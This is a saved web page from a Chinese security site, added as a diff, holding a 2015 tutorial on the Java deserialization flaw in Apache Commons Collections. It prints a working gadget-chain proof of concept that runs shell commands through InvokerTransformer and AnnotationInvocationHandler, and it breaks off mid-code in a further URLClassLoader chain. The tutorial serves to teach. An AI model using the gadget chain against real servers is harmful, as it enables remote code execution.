@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html class=""><head><script type="text/javascript" src="/static/api/js/share/api_base.js"></script>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">	
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+<title>Java反序列化漏洞详解 - SecPulse.COM | 安全脉搏</title>
+<meta name="description" content="Java反序列化漏洞从爆出到现在快2个月了，已有白帽子实现了jenkins，weblogic，jboss等的代码执行利用工具。本文对于Java反序列化的漏洞简述后，并对于Java反序列化的Poc进行详细解读。">
+<meta name="keywords" content="java,反序列化漏洞,漏洞">
+
+<link rel="stylesheet" id="style-css" href="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="jquery.fancybox-css" href="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/jquery.css" type="text/css" media="all">
+<link rel="stylesheet" id="font-awesome-css" href="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/font-awesome.css" type="text/css" media="all">
+<link rel="stylesheet" id="wpzan-css" href="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/wp-zan-0.css" type="text/css" media="all">
+<script src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/hm.js"></script><script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/jquery_004.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/jquery.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/jquery_005.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/jquery_002.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/owl.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/custom.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/comments-ajax.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/jquery_003.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/jquery-migrate.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var wpzan_ajax_url = "https:\/\/www.secpulse.com\/wp-admin\/admin-ajax.php";
+/* ]]> */
+</script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/wp-zan.js"></script>
+<link rel="canonical" href="https://www.secpulse.com/archives/42126.html">
+		<style type="text/css">
+			.wp-zan{
+				color: !important
+			}
+			.wp-zan:hover{
+				color: !important
+			}
+			.wp-zan.zaned{
+				color: !important
+			}
+		</style>
+	<link rel="stylesheet" type="text/css" href="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/shCore.css"><link rel="stylesheet" type="text/css" href="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/shThemeEmacs.css"><style type="text/css" id="syntaxhighlighteranchor"></style>
+<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<script src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/share.js"></script><style type="text/css">.fancybox-margin{margin-right:17px;}</style></head>
+<body class="single single-post postid-42126 single-format-standard">
+	<header id="header" class="header clr">
+		<div class="header-top inner clr">
+	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
+	</h4>
+	</hgroup>
+
+<div class="login xs-hidden">
+				<div class="logindiv">
+					<div class="img">
+<img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/rabbit.jpg" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" width="36" height="36"></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i class="fa fa-caret-down fa-2"></i>
+					<ul class="login-links">
+						<li class="log"><a href="https://www.secpulse.com/wp-login.php" target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
+						<li class="exit"><a href="https://www.secpulse.com/wp-login.php?action=register"><i class="fa fa-user-times"></i><span>注册</span></a></li>
+					</ul>
+	
+  </div>
+			</div>
+			<div class="top-search xs-hidden">
+  <form id="search" method="get" action="https://www.secpulse.com">
+	<input name="s" id="s" autocomplete="off" placeholder="输入搜索内容" type="text">
+	<button class="btn-search"> <i class="fa fa-search"></i></button>
+</form></div>
+			<div class="menu-button">
+				<i class="fa fa-bars fa-3x"></i>
+			</div>
+		</div>
+
+
+		<div class="main-nav  xs-hidden">
+			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
+<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
+<ul class="sub-menu">
+	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
+	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
+	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
+	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
+	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
+	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
+	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
+	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
+	<ul class="sub-menu">
+		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
+		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
+	</ul>
+</li>
+	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
+</ul>
+</li>
+<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
+<ul class="sub-menu">
+	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
+	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
+</ul>
+</li>
+<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
+<ul class="sub-menu">
+	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
+	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
+	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
+	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
+</ul>
+</li>
+<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
+<ul class="sub-menu">
+	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
+	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
+	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
+	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
+</ul>
+</li>
+<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
+<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
+<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
+<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
+</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com/">安全服务</a></li>
+<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com/">安全导航</a></li>
+<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com/">多因素</a></li>
+</ul></nav></div>
+		</div>
+		<div class="nav-bg"></div>
+   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
+</ul></nav>     </header><section class="xs-main index-main clr">
+<div class="inner">
+<div class="xs-left">
+<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com/">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/sec-doc" rel="category tag">安全文献</a> &gt;  正文 </nav><article id="post-42126" class="post-42126 post type-post status-publish format-standard hentry category-sec-doc tag-java tag-54679 tag-2434">
+	<header class="single-header">
+		<h1>Java反序列化漏洞详解</h1>
+			<div class="single-meta">
+				
+		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /12/27 23:24</a></div>
+			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">13,833</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/42126.html#respond">沙发</a></div>
+			
+			
+		</div>
+		<!-- .entry-meta -->
+	</header>
+	<!-- .single-header -->
+
+	<div class="single-main">
+		<p><a href="http://www.secpulse.com/wp-content/uploads/2015/12/01111.jpg" class="fancybox-buttons" rel="button"><img class="alignnone size-full wp-image-42127 img-responsive" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/01111.jpg" alt="01111" width="617" height="388"></a></p>
+<p>Java反序列化漏洞从爆出到现在快2个月了，已有白帽子实现了jenkins，weblogic，jboss等的代码执行利用工具。本文对于Java反序列化的漏洞简述后，并对于Java反序列化的Poc进行详细解读。</p>
+<p><span style="color: #ff6600"><strong>Java反序列化漏洞简介</strong></span></p>
+<p>Java序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，Java中的ObjectOutputStream类的writeObject()方法可以实现序列化。</p>
+<p>Java反序列化即逆过程，由字节流还原成对象。ObjectInputStream类的readObject()方法用于反序列化。</p>
+<p>因此要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化代码。能符合以上条件的地方即存在漏洞。</p>
+<p><strong><span style="color: #ff6600">Java反序列化Poc详解</span></strong></p>
+<pre class="brush: python; title: ; notranslate" title="">public class test {
+public static void main(String[] args) throws Exception {
+String[] execArgs = new String[] { "sh", "-c", "whoami &gt; /tmp/fuck" };
+Transformer[] transformers = new Transformer[] {
+new ConstantTransformer(Runtime.class),
+new InvokerTransformer(
+"getMethod",
+new Class[] {String.class, Class[].class },
+new Object[] {"getRuntime", new Class[0] }
+),
+new InvokerTransformer(
+"invoke",
+new Class[] {Object.class,
+Object[].class }, new Object[] {null, null }
+),
+new InvokerTransformer(
+"exec",
+new Class[] {String[].class },
+new Object[] { execArgs }
+)
+};
+Transformer transformedChain = new ChainedTransformer(transformers);
+Map&lt;String, String&gt; BeforeTransformerMap = new HashMap&lt;String, String&gt;();
+BeforeTransformerMap.put("hello", "manning");
+Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);
+Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+ctor.setAccessible(true);
+Object instance = ctor.newInstance(Target.class, AfterTransformerMap);
+File f = new File("temp.bin");
+ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
+out.writeObject(instance);
+}
+}</pre>
+<p>如果想彻底理解上面的poc，需要明白Java中的一些概念。</p>
+<p>在Apache commons工具包中有很多jar包（jar包可以理解为python的库），具体jar包里面含有的内容，如下图所示。</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2015/12/22.png" class="fancybox-buttons" rel="button"><img class="alignnone size-full wp-image-42128 img-responsive" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/22.png" alt="22" width="270" height="222"></a></p>
+<p>其中Java反序列化的问题出在org.apache.commons.collections这个库里面。
+org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也
+属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为
+collection的对象。具象的collection为set，list，queue等等。换一种理解方式，collection是
+set，list，queue的抽象，collection中文含义是收集的意思，那么收集的具体方式就可以是set，list，queue了。</p>
+<p>在org.apache.commons.collections内提供了一个接口类叫Transformer，这个接口的英文定义为</p>
+<p><strong><span style="color: #800000"><em>Defines a functor interface implemented by classes that transform one object into another.</em></span></strong><br>
+也就是说接口于Transformer的类都具备把一个对象转化为另一个对象的功能。目前已知接口于Transformer的类，如下如所示。</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2015/12/33.png" class="fancybox-buttons" rel="button"><img class="alignnone size-full wp-image-42129 img-responsive" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/33.png" alt="33" width="300" height="98"></a></p>
+<p>图上带箭头指示的为Java反序列化漏洞的poc含有的类。</p>
+<p>ConstantTransformer Transformer implementation that returns the same constant each time. （把一个对象转化为常量，并返回）</p>
+<p>InvokerTransformer Transformer implementation that creates a new object instance by reflection. （通过反射，返回一个对象）</p>
+<p>ChainedTransformer Transformer implementation that chains the 
+specified transformers together. 
+（把一些transformer链接到一起，构成一组链条，对一个对象依次通过链条内的每一个transformer进行转换）</p>
+<p>有了以上的相关概念，就可以理解最开始的poc了。poc里面，我们一共创建了以下关键对象。</p>
+<p>execArgs</p>
+<p>待执行的命令数组</p>
+<p>transformers 一个transformer链，包含预设转化逻辑（各类transformer对象）的转化数组</p>
+<p>transformedChain ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作</p>
+<p>BeforeTransformerMap Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict理解即可</p>
+<p>AfterTransformerMap Map数据结构，转换后的Map</p>
+<p>整个poc的逻辑可以这么理解，构建了BeforeTransformerMap的键值对，为其赋值，利用TransformedMap的decorate方法，可以对Map数据结构的key，value进行transforme。</p>
+<p>TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，
+第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。</p>
+<p>TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2015/12/44.png" class="fancybox-buttons" rel="button"><img class="alignnone size-full wp-image-42130 img-responsive" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/44.png" alt="44" width="300" height="125"></a></p>
+<p>图是调试时的转换变量内容，可以很清楚地看到执行完poc后，已经对Map的value进行了转换（过了一遍transformer链）。</p>
+<p>poc中对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行。</p>
+<p>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。</p>
+<p>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p>
+<p>因此我们在poc中看见了下行的代码。</p>
+<p><!--StartFragment --></p>
+<div>
+<pre class="brush: python; title: ; notranslate" title="">&lt;/div&gt;
+Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");</pre>
+<p>这个类完全符合我们的要求，具体解释可以查看TSRC的文章。</p>
+<p>如果要实现一个可控的poc，需要对transformer链的构造进行理解。首先来看InvokerTransformer。</p>
+<p><!--StartFragment --></p>
+<div>
+<pre class="brush: python; title: ; notranslate" title="">&lt;/div&gt;
+InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)
+InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</pre>
+<p>参数依次为：方法名称，参数类型，参数对象 我们找其中一个来看下。</p>
+<p><!--StartFragment --></p>
+<div>
+<pre class="brush: python; title: ; notranslate" title="">&lt;/div&gt;
+new InvokerTransformer(
+"getMethod",
+new Class[] {String.class, Class[].class },
+new Object[] {"getRuntime", new Class[0] }
+),
+new InvokerTransformer(
+"invoke",
+new Class[] {Object.class, Object[].class },
+new Object[] {null, null }
+),
+new InvokerTransformer(
+"exec",
+new Class[] {String.class },
+new Object[] {"gedit"}
+)</pre>
+<p>参数类型里面的内容完全对应于参数对象里的内容。</p>
+<p>PS：由于Method类的invoke(Object obj,Object args[])方法的定义，所以在反射内写new Class[] {Object.class, Object[].class }。</p>
+<p>所以正常流程如下所示：</p>
+<p><span style="color: #800000"><strong><em>((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");</em></strong></span><br>
+基于报错的反序列化transformer链</p>
+<p><!--StartFragment --></p>
+<div>
+<pre class="brush: python; title: ; notranslate" title="">&lt;/div&gt;
+Transformer[] transformers = new Transformer[] {
+new ConstantTransformer(Java.net.URLClassLoader.class),
+new InvokerTransformer(
+"getConstructor",
+new Class[] {Class[].class},
+new Object[] {new Class[]{Java.net.URL[].class}}
+),
+new InvokerTransformer(
+"newInstance",
+new Class[] {Object[].class},
